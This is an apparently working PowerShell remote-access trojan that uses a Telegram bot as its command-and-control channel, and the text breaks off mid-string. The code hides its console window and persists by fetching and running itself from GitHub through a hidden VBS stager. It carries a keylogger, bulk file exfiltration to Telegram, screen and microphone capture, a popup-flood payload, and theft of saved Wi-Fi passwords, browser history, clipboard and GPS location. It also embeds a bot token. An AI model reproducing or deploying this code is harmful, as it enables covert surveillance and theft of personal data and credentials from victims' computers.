<# ============================================= Beigeworm's Telegram C2 Client ========================================================

SYNOPSIS
Using a Telegram Bot's Chat to Act as a Command and Control Platform.

INFORMATION
This script will wait until it is called in chat by the computer name to take commands from telegram.
A list of Modules can be accessed by typing 'options' in chat, or you can use the chat to act simply as a reverse shell.

SEE README FOR MORE INFO
#>
# ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
# Define Connection Variables
$Token = "7890120010:AAFC34LWI61JXm8hLwz-OlOHVgsXe--pcxg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
$PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
$global:errormsg = 0 # 1 = return error messages to chat (off by default)
$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window
$version = "1.7.1" # Current Version
$parent = "https://github.com/Andre0194/service/blob/master/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
$URL = 'https://api.telegram.org/bot{0}' -f $Token
$AcceptedSession=""
$LastUnAuthenticatedMessage=""
$lastexecMessageID=""

# Hide the console window
If ($HideWindow -gt 0){
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Check version and update
$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
$versionCheck = irm -Uri "https://pastebin.com/raw/53qHJkJC"
$VBpath = "C:\Windows\Tasks\service.vbs"
if (Test-Path $newScriptPath){
Write-Output "Persistance Installed - Checking Version.."
    if (!($version -match $versionCheck)){
        Write-Output "Newer version available! Downloading and Restarting"
        Remove-Persistance
        Add-Persistance
        $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://github.com/Andre0194/service/blob/master/Telegram-C2-Client.ps1 | iex`", 0, True
"@
        $tobat | Out-File -FilePath $VBpath -Force
        sleep 1
        & $VBpath
        exit
    }
}

# remove restart stager (if present)
if(Test-Path "C:\Windows\Tasks\service.vbs"){
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}

# Startup Delay
Sleep 5

# Get Chat ID from the bot
while($chatID.length -eq 0){
    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
    Sleep 10
}

# Emoji characters and other setup
$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
$Mts = New-Object psobject 
$Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID

#----------------------------------------------- COMMANDS / FUNCTIONS ----------------------------------------------

Function Options{
$contents = "==============================================
============= $cmde Commands List $cmde ============
==============================================

Close   : Close this Session
Extra-Info    : Extra commands information
Pause-Session   : Pause this session
Toggle-Errors    : Toggle error messages to chat
Folder-Tree    : Gets Dir tree and sends it zipped
SpeechToText  : Send audio transcript to Discord
Record-Audio  : Record microphone to Discord
Record-Screen  : Record Screen to Discord             
Screenshot   : Sends a screenshot of the desktop
Key-Capture    : Capture Keystrokes and send
Exfiltrate   : Sends files (see 'Extra-Info' for more)
Upload      : Uploads a specific file (use -path)
System-Info   : Send System info as text file
Enumerate-LAN   : Info for other devices on the LAN
Add-Persistance   : Add Telegram C2 to Startup
Remove-Persistance   : Remove Startup Persistance
Is-Admin   : Checks if session has admin Privileges
Attempt-Elevate  : Send user a prompt to gain Admin
Message   : Send a custom message to the user
Take-Picture  : Send a Webcann picture.
Nearby-Wifi  : Show nearby wifi networks       
Send-Hydra  : Never ending popups (use killswitch)   
Kill    : Killswitch for 'Key-Capture' and 'Exfiltrate' 
**ADMIN ONLY FUNCTIONS**
Disable-AV   : Attempt to exclude C:/ from Defender
Disable-HID   : Disable Mice and Keyboards
Enable-HID    : Enable Mice and Keyboards

=============================================="
Post-Message | Out-Null
}

Function Extra-Info{
$contents = "==============================================
============ $glass Examples and Info $glass ===========
==============================================

=========  Exfiltrate Command Examples ==========
( PS`> Exfiltrate -Path Documents -Filetype png )
( PS`> Exfiltrate -Filetype log )
( PS`> Exfiltrate )
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

PATH
Documents, Desktop, Downloads,
OneDrive, Pictures, Videos.
FILETYPE
log, db, txt, doc, pdf, jpg, jpeg, png,
wdoc, xdoc, cer, key, xls, xlsx,
cfg, conf, docx, rft.

===========  Upload Command Example ===========
( PS`> Upload -Path C:/Path/To/File.txt )
Use 'Folder-Tree' command to show all files

============  Enumerate-LAN Example ============
( PS`> Enumerate-LAN -Prefix 192.168.1. )
This Eg. will scan 192.168.1.1 to 192.168.1.254

===============  Message Example ===============
( PS`> Message 'Your Message Here!' )

================== Record Examples =================
( Record-Audio -t 100 ) number of seconds to record     
( Record-Screen -t 100 ) number of seconds to record     
=============================================="
Post-Message | Out-Null
}

Function Close{
$contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
Post-Message
rm -Path "$env:temp/tgc2.txt" -Force
exit
}

Function Upload{
param ([string[]]$Path)
if (Test-Path -Path $path){
    $extension = [System.IO.Path]::GetExtension($path)
    if ($extension -eq ".exe" -or $extension -eq ".msi") {
        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
        Write-Output "File Upload Complete: $path"
        Rm -Path $tempZipFilePath -Recurse -Force
    }else{
        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
        Write-Output "File Upload Complete: $path"
    }
}else{Write-Host "File Not Found: $path"}
}

Function Nearby-Wifi {
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4
$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)
$contents = "$wifi"
Post-Message | Out-Null
}

Function Send-Hydra {
$tobat = @'
$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $Import -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
Add-Type -AssemblyName System.Windows.Forms
    function Create-Form {
        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
        $form.Controls.AddRange(@($Text, $Close));return $form
    }
    while ($true) {
        $form = Create-Form
        $form.StartPosition = 'Manual'
        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
        $result = $form.ShowDialog()
        $messages=ReceiveMSG
        if ($messages.message.text -contains "kill") {
            $contents = "$comp $env:COMPUTERNAME $closed Hydra Stopped!"
            Post-Message
            break
        }
        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
            $form2 = Create-Form
            $form2.StartPosition = 'Manual'
            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
            $form2.Show()
        }
        $random = (Get-Random -Minimum 0 -Maximum 2)
        Sleep $random
    }
'@
$pth = "C:\Windows\Tasks\service.ps1"
$tobat | Out-File -FilePath $pth -Force
& $pth
Sleep 7
rm -Path $pth
$contents = "$comp $env:COMPUTERNAME $waiting Sent Hydra to User.."
Post-Message
}

Function SpeechToText {
$contents = "$tick $env:COMPUTERNAME $tick Transcription Started.. (Stop with Killswitch)"
Post-Message
Add-Type -AssemblyName System.Speech
$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
$grammar = New-Object System.Speech.Recognition.DictationGrammar
$speech.LoadGrammar($grammar)
$speech.SetInputToDefaultAudioDevice()
while ($true) {
    $result = $speech.Recognize()
    if ($result) {
        $results = $result.Text
        $contents = "$results"
        Post-Message
    }
    $messages=ReceiveMSG
    if ($messages.message.text -contains "kill") {
        $contents = "$comp $env:COMPUTERNAME $closed Transcription Killed"
        Post-Message
    }
}
}

Function Record-Audio{
param ([int[]]$t)
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)){  
    GetFfmpeg
}
sleep 1
$contents = "$comp $env:COMPUTERNAME $tick Recording Started for $t seconds.."
Post-Message | Out-Null
Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
$id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
$filePath = "$env:Temp\AudioClip.mp3"
if ($t.Length -eq 0){$t = 10}
.$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $filePath
Post-File
sleep 1
rm -Path $filePath -Force
}

Function Record-Screen{
param ([int[]]$t)
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)){  
    GetFfmpeg
}
sleep 1
$contents = "$comp $env:COMPUTERNAME $tick Recording Started for $t seconds.."
Post-Message | Out-Null
$filePath = "$env:Temp\ScreenClip.mp4"
if ($t.Length -eq 0){$t = 10}
.$env:Temp\ffmpeg.exe -f gdigrab -framerate 20 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $filePath
Post-File
sleep 1
rm -Path $filePath -Force
}

Function Exfiltrate {
param ([string[]]$FileType,[string[]]$Path)
$maxZipFileSize = 50MB
$currentZipSize = 0
$index = 1
$FilePath ="$env:temp/Loot$index.zip"
$contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
Post-Message | Out-Null
If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}
If($FileType -ne $null){$fileExtensions = "*."+$FileType}
else {$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.docx", "*.rft")}
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($FilePath, 'Create')
$escmsg = "Files from : "+$env:COMPUTERNAME
foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                $currentZipSize = 0
                Post-File; rm -Path $FilePath -Force
                Sleep 1
                $index++
                $FilePath ="$env:temp/Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($FilePath, 'Create')
                $messages=ReceiveMSG
                    if ($messages.message.text -contains "kill") {
                    $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
                    Post-Message
                    break
                    }
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName) | Out-Null
                $currentZipSize += $fileSize
            }
        }
    }
$zipArchive.Dispose()
Post-File ;rm -Path $FilePath -Force
$contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
Post-Message | Out-Null
}

Function Screenshot{
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    $filePath = "$env:Temp\ScreenClip.jpg"
    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $filePath
    Post-File ;rm -Path $FilePath -Force
}

Function Key-Capture {
$contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
Post-Message | Out-Null
$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
    $keyPressed = $false
    try{
    while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
        Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        $keyst = $API::GetAsyncKeyState($asc)
            if ($keyst -eq -32767) {
            $keyPressed = $true
            $LastKeypressTime.Restart()
            $null = [console]::CapsLock
            $vtkey = $API::MapVirtualKey($asc, 3)
            $kbst = New-Object Byte[] 256
            $checkkbst = $API::GetKeyboardState($kbst)
            $logchar = New-Object -TypeName System.Text.StringBuilder          
                if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                $LString = $logchar.ToString()
                    if ($asc -eq 8) {$LString = "[BKSP]"}
                    if ($asc -eq 13) {$LString = "[ENT]"}
                    if ($asc -eq 27) {$LString = "[ESC]"}
                    $nosave += $LString 
                    }
                }
            }
        }
        $messages=ReceiveMSG
        if ($messages.message.text -contains "kill") {
        $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
        Post-Message | Out-Null
        $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://github.com/Andre0194/service/blob/master/Telegram-C2-Client.ps1 | iex`", 0, True
"@
        $pth = "C:\Windows\Tasks\service.vbs"
        $tobat | Out-File -FilePath $pth -Force
        & $pth
        Sleep 5
        rm -Path $pth
        Write-Output "Restarting C2.. You must re-authenticate!"
        exit
        }
    }
    finally{
        If (($keyPressed) -and (!($messages.message.text -match "kill"))) {
            $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $contents = "$glass Keys Captured : "+$escmsgsys
            Post-Message | Out-Null
            $keyPressed = $false
            $nosave = ""
        }
    }
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
}

Function System-Info{
$contents = "$comp Gathering System Information for $env:COMPUTERNAME $comp"
Post-Message
Add-Type -AssemblyName System.Windows.Forms
# WMI Classes
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$processor = "$($processorInfo.Name)"
$gpu = "$($videocardinfo.Name)"
$DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
# User Information
$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = (Get-ComputerInfo).WindowsRegisteredOwner
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$OSString = "$($systemInfo.Caption)"
$OSArch = "$($systemInfo.OSArchitecture)"
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"
$clipboard = Get-Clipboard
# System Information
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
# Nearby WiFi Networks
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4
$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)
# Current System Metrics
function Get-PerformanceMetrics {
    $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue

    return [PSCustomObject]@{
        CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
        MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
        DiskIO = "{0:F2}" -f $diskIO.CookedValue
        NetworkIO = "{0:F2}" -f $networkIO.CookedValue
    }
}
$metrics = Get-PerformanceMetrics
$PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
$PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
$PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
$PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
# History and Bookmark Data
$Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')
$outpath = "$env:temp\Browsers.txt"
foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        $Value = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique

        $Value | ForEach-Object {
            [PSCustomObject]@{
                Browser  = $Browser
                DataType = $DataValue
                Content = $_
            }
        } | Out-File -FilePath $outpath -Append
    }
}
$Value = Get-Content -Path $outpath
$Value = ($Value | Out-String)
# Saved WiFi Network Info
$outssid = ''
$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws){
    if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
        $ssid=$s.Trim()
        if($s -Match ":"){
            $ssid=$s.Split(":")[1].Trim()
            }
        $pw=(netsh wlan show profiles name=$ssid key=clear)
        $pass="None"
        foreach($p in $pw){
            if($p -Match "Key Content"){
            $pass=$p.Split(":")[1].Trim()
            $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
            }
        }
    }
    $a++
}
# GPS Location Info
Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
	Sleep -M 100
}  
if ($GeoWatcher.Permission -eq 'Denied'){
    $GPS = "Location Services Off"
}
else{
	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
	$GL = $GL -split " "
	$Lat = $GL[0].Substring(11) -replace ".$"
	$Lon = $GL[1].Substring(10) -replace ".$"
    $GPS = "LAT = $Lat LONG = $Lon"
}
function EnumNotepad{
$appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
$directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
$matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
foreach ($dir in $matchingDirectories) {
    $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
    $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
    foreach ($fullFilePath in $listOfBinFiles) {
        if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
            continue
        }
        $seperator = ("=" * 60)
        $SMseperator = ("-" * 60)
        $seperator | Out-File -FilePath $outpath -Append
        $filename = $fullFilePath.Name
        $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
        $isSavedFile = $contents[3]
        if ($isSavedFile -eq 1) {
            $lengthOfFilename = $contents[4]
            $filenameEnding = 5 + $lengthOfFilename * 2
            $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
            "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append

        } else {
            "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            $filenameEnding = 0
            $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
            $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
            $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
            $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
            $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
            $originalFileContent = ""
            for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                if ($originalFileBytes[$i] -ne 0) {
                    $originalFileContent += [char]$originalFileBytes[$i]
                }
            }
            $originalFileContent | Out-File -FilePath $outpath -Append
        }
     "`n" | Out-File -FilePath $outpath -Append
    }
}
}

$contents = "
===================================================
User Information
---------------------------------------------------
Current User          : $env:USERNAME
Email Address         : $email
Language              : $systemLanguage
Keyboard Layout       : $keyboardLayoutID
Other Accounts        : $users
Current OS            : $OSString
Build ID              : $ver
Architechture         : $OSArch
Screen Size           : $screensize
Location              : $GPS

====================================================
Hardware Information
----------------------------------------------------
Processor             : $processor 
Memory                : $RamInfo
Gpu                   : $gpu

Storage
----------------------------------------
$Hddinfo
$DiskHealth
Current System Metrics
----------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio

=====================================================
Network Information
-----------------------------------------------------
Public IP Address     : $computerPubIP

Saved WiFi Networks
----------------------------------------
$outssid

Nearby Wifi Networks
----------------------------------------
$Wifi
"

$infomessage2 = "
==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
----------------------------------------
$Value

Powershell History
